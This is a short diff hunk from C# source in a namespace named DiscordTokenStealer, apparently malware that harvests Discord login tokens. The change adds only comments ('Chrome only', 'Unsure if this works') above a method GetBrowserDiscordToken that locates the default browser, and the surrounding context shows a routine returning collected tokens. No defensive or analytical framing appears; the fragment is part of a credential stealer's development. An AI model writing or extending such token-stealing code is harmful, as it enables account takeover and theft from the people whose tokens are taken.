@@ -52,7 +52,10 @@ namespace DiscordTokenStealer
             }
             return tokens;
         }
-
+        
+        // Chrome only
+        // Unsure if this works
+        // I don't have chrome installed
         private static string? GetBrowserDiscordToken()
         {
             FileInfo? defaultBrowser = GetDefaultBrowserLocation();
